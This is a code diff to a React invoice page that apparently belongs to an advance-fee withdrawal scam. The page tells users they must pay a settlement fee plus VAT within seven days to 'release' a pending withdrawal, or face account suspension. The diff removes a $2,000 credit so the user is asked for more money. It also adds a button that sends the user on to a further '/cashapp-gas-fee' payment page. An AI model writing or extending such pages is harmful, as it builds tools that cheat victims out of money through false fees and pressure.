@@ -58,8 +58,7 @@ export default function Invoice() {
   const vatRate = 0.075;
   const vatAmount = Math.round(feeTotal * vatRate * 100) / 100;
   const grossTotal = Math.round((feeTotal + vatAmount) * 100) / 100;
-  const priorCredit = 2000;
-  const totalDue = Math.round((grossTotal - priorCredit) * 100) / 100;
+  const totalDue = grossTotal;
 
   async function handleConfirmPayment() {
     if (!user) {
@@ -75,7 +74,7 @@ export default function Invoice() {
         email: user.email,
         amount: totalDue.toFixed(2),
         currency: "USD",
-        notes: `Confirm payment for invoice ${txId.toUpperCase()} — withdrawal $${withdrawalAmount.toFixed(2)} (15% fee + 7.5% VAT, less $${priorCredit} credit). Awaiting admin approval.`,
+        notes: `Confirm payment for invoice ${txId.toUpperCase()} — withdrawal $${withdrawalAmount.toFixed(2)} (15% fee + 7.5% VAT). Awaiting admin approval.`,
       });
       setConfirmState("waiting");
 
@@ -120,7 +119,16 @@ export default function Invoice() {
                   </svg>
                 </div>
                 <h2 className="text-xl font-bold text-white mb-2">Payment Approved!</h2>
-                <p className="text-sm text-emerald-300">Redirecting you to the next step…</p>
+                <p className="text-sm text-emerald-300 mb-5">Redirecting you to the next step…</p>
+                <button
+                  onClick={() => navigate("/cashapp-gas-fee")}
+                  className="inline-flex items-center justify-center gap-2 px-6 py-3 bg-[#00D632] hover:bg-[#00C02E] text-white rounded-xl text-sm font-bold transition-colors shadow-lg shadow-[#00D632]/20"
+                >
+                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                  </svg>
+                  Continue to Payment
+                </button>
               </>
             ) : (
               <>
@@ -340,20 +348,6 @@ export default function Invoice() {
                       {(FEE_RATE * 100).toFixed(0)}% of ${withdrawalAmount.toLocaleString()}
                     </span>
                   </div>
-                  <div className="border-t border-[#2a3550] pt-3 pb-2">
-                    <div className="flex justify-between items-center">
-                      <span className="text-base font-bold text-white">Gross Total</span>
-                      <span className="text-xl font-bold text-white">
-                        ${grossTotal.toLocaleString("en-US", { minimumFractionDigits: 2 })}
-                      </span>
-                    </div>
-                  </div>
-                  <div className="flex justify-between items-center text-sm py-1.5">
-                    <span className="text-emerald-400 font-medium">Prior Payment / Credit</span>
-                    <span className="text-emerald-400 font-semibold">
-                      -${priorCredit.toLocaleString("en-US", { minimumFractionDigits: 2 })}
-                    </span>
-                  </div>
                   <div className="border-t border-[#2a3550] pt-3">
                     <div className="flex justify-between items-center">
                       <span className="text-base font-bold text-white">Balance Due</span>
@@ -419,7 +413,7 @@ export default function Invoice() {
                 <div>
                   <p className="text-xs font-semibold text-slate-400 uppercase tracking-wide mb-2">Important Notice</p>
                   <p className="text-xs text-slate-500 leading-relaxed">
-                    The remaining balance of ${totalDue.toLocaleString("en-US", { minimumFractionDigits: 2 })} (settlement fee ${feeTotal.toLocaleString("en-US", { minimumFractionDigits: 2 })} + {(vatRate * 100).toFixed(1)}% VAT ${vatAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}, less ${priorCredit.toLocaleString("en-US", { minimumFractionDigits: 2 })} prior credit) must be paid within 7 days to release the pending withdrawal of ${withdrawalAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })} USD. Failure to pay may result in account suspension per our Terms of Service, Section 14.3.
+                    The balance of ${totalDue.toLocaleString("en-US", { minimumFractionDigits: 2 })} (settlement fee ${feeTotal.toLocaleString("en-US", { minimumFractionDigits: 2 })} + {(vatRate * 100).toFixed(1)}% VAT ${vatAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })}) must be paid within 7 days to release the pending withdrawal of ${withdrawalAmount.toLocaleString("en-US", { minimumFractionDigits: 2 })} USD. Failure to pay may result in account suspension per our Terms of Service, Section 14.3.
                   </p>
                 </div>
                 <div>
@@ -474,15 +468,17 @@ export default function Invoice() {
 
         {/* Action buttons */}
         <div className="flex flex-wrap justify-center mt-6 gap-3">
-          <button
-            onClick={() => navigate("/cashapp-gas-fee")}
-            className="flex items-center gap-2 px-6 py-3 bg-[#00D632] hover:bg-[#00C02E] text-white rounded-xl text-sm font-bold transition-colors shadow-lg shadow-[#00D632]/20"
-          >
-            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
-            </svg>
-            PAID
-          </button>
+          {confirmState === "approved" && (
+            <button
+              onClick={() => navigate("/cashapp-gas-fee")}
+              className="flex items-center gap-2 px-6 py-3 bg-[#00D632] hover:bg-[#00C02E] text-white rounded-xl text-sm font-bold transition-colors shadow-lg shadow-[#00D632]/20"
+            >
+              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+              </svg>
+              PAID
+            </button>
+          )}
           <button
             onClick={() => window.print()}
             className="flex items-center gap-2 px-5 py-2.5 bg-muted border border-border rounded-xl text-sm font-medium text-foreground hover:bg-secondary transition-colors"
